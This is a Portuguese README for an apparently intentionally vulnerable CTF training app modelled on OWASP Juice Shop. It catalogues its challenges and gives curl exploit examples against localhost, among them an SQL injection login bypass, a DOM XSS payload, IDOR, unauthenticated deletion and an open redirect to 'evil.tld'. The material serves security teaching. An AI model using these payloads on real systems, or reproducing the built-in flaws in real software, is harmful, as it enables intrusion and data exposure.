# Desafios CTF

HackBurger embute vulnerabilidades intencionais inspiradas no OWASP Juice Shop. Cada exploit bem-sucedido registra uma conquista em `challenge_completions` e soma pontos no ranking público em `/api/scores/leaderboard`.

> **Importante**: toda detecção acontece no backend. O frontend apenas renderiza feedback (confetti + toast). Não adianta chamar `POST /api/scores/complete` manualmente — a rota existe para uso interno, e os desafios reais só são validados quando o detector identifica o padrão correto no tráfego HTTP.

## Como um desafio é detectado

1. O usuário envia um payload malicioso (SQLi, XSS, IDOR etc.) em algum endpoint.
2. O controller/service do endpoint inspeciona a entrada (ou verifica invariantes violadas).
3. Ao reconhecer o padrão, chama `ScoreModel.complete(userId, 'challengeKey', pontos)`.
4. Se o exploit funcionar, a resposta da API é o **efeito colateral normal** (por exemplo um JWT válido de admin) — a pontuação vai por fora.
5. Na próxima chamada autenticada, o frontend detecta o aumento no `GET /api/scores/me` e dispara o confetti.

## Catálogo (1-star)

| Chave | Pts | Pista |
|---|---|---|
| `scoreBoardChallenge` | 10 | Encontre a página de ranking (está escondida no rodapé do site). |
| `privacyPolicyChallenge` | 10 | Leia a política de privacidade em `GET /api/legal/privacy`. |
| `errorHandlingChallenge` | 10 | Provoque um 500 com stack trace na resposta. Algumas rotas de debug não tratam inputs malformados. |
| `exposedMetricsChallenge` | 10 | `GET /metrics` está disponível publicamente (Prometheus). |
| `domXssChallenge` | 10 | A busca (`/catalog?q=...`) renderiza o termo buscado sem sanitização. |
| `confidentialDocumentChallenge` | 10 | Navegue em `/ftp` — um arquivo não deveria estar lá. |
| `zeroStarsChallenge` | 10 | `POST /api/feedback` aceita `rating: 0` embora o front só mostre estrelas 1–5. |
| `repetitiveRegistrationChallenge` | 10 | Tente registrar o mesmo email duas vezes em `POST /api/auth/register`. |
| `missingEncodingChallenge` | 10 | Há um arquivo em `/ftp` cujo nome exige URL-encode para acessar. |
| `outdatedAllowlistChallenge` | 10 | `/redirect?to=...` usa uma allow-list frouxa (substring). |

### Exemplos rápidos de exploração

```bash
# Score Board
# abra o modal pelo botão "Ranking" no rodapé

# Privacy Policy
curl -H "Authorization: Bearer $TOKEN" http://localhost:3000/api/legal/privacy

# Error Handling
curl -H "Authorization: Bearer $TOKEN" "http://localhost:3000/api/debug/inspect?payload=not-json"

# Exposed Metrics
curl -H "Authorization: Bearer $TOKEN" http://localhost:3000/metrics

# DOM XSS
# http://localhost:4200/catalog?q=<iframe src="javascript:alert(1)"></iframe>

# Confidential Document
curl -H "Authorization: Bearer $TOKEN" http://localhost:3000/ftp/confidential.md

# Zero Stars
curl -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"author":"hacker","rating":0,"comment":"meh"}' http://localhost:3000/api/feedback

# Outdated Allowlist
curl -H "Authorization: Bearer $TOKEN" "http://localhost:3000/redirect?to=https://evil.tld/%23github.com/dionelimabr"

# Missing Encoding
curl -H "Authorization: Bearer $TOKEN" "http://localhost:3000/ftp/encode%20me.md%23secret"
```

> **Nota**: para pontuar, você precisa enviar um JWT válido no header `Authorization`. Se a rota é pública (ex: `/metrics`), o detector ainda tenta decodificar o token soft — faça login primeiro, copie o token do `localStorage` e use nos exemplos acima.

## Catálogo (2-star)

| Chave | Pts | Pista |
|---|---|---|
| `adminSectionChallenge` | 20 | Existe uma rota escondida `/api/misc/administration` (nome típico de painel antigo). |
| `loginAdminChallenge` | 20 | `POST /api/legacy/login` concatena SQL. Payload clássico `admin@hackburger.com'--`. |
| `emptyUserRegistrationChallenge` | 20 | `POST /api/legacy/register` não valida campos; envie `name:""`, `email:""`. |
| `fiveStarFeedbackChallenge` | 20 | `DELETE /api/feedback/:id` não requer autenticação — delete o único feedback de 5 estrelas. |
| `viewBasketChallenge` | 20 | `GET /api/cart?userId=X` confia cegamente no `userId` da query. |
| `weirdCryptoChallenge` | 20 | `GET /api/misc/crypto/token/:userId` usa MD5 para tokens de reset. |
| `whiteHatChallenge` | 20 | Descubra o `security.txt` em `/security.txt` ou `/.well-known/security.txt`. |

### Exemplos (2-star)

```bash
# login_admin
curl -X POST http://localhost:3000/api/legacy/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@hackburger.com'\''--","password":"x"}'

# empty_user_registration
curl -X POST http://localhost:3000/api/legacy/register \
  -H "Content-Type: application/json" -d '{"name":"","email":"","password":""}'

# view_basket (autenticado)
curl -H "Authorization: Bearer $TOKEN" "http://localhost:3000/api/cart?userId=1"

# five_star_feedback
curl -X DELETE http://localhost:3000/api/feedback/1

# weird_crypto
curl -H "Authorization: Bearer $TOKEN" http://localhost:3000/api/misc/crypto/token/1

# white_hat
curl http://localhost:3000/.well-known/security.txt
```

## Como jogar

1. Faça login (é necessário usuário autenticado para acumular pontos).
2. Explore a aplicação procurando pistas — nem tudo fica no menu principal.
3. Use DevTools, Burp Suite, cURL ou qualquer ferramenta que preferir.
4. Abra o ranking no rodapé para ver quais desafios você resolveu e quantos ainda faltam.

## Para criadores de desafios

Ao adicionar um novo desafio:

1. Inclua a chave em `backend/src/services/score.service.ts` com sua pontuação.
2. Implemente a detecção no local adequado (rota, service, middleware — o que fizer sentido).
3. Invoque `ScoreModel.complete(userId, 'challengeKey', pts)` somente quando o exploit real funcionar.
4. Atualize esta lista de catálogo com uma descrição curta.

Nunca coloque o gatilho em um caminho que um usuário legítimo possa ativar por acidente: desafios não devem dar pontos por navegação normal.
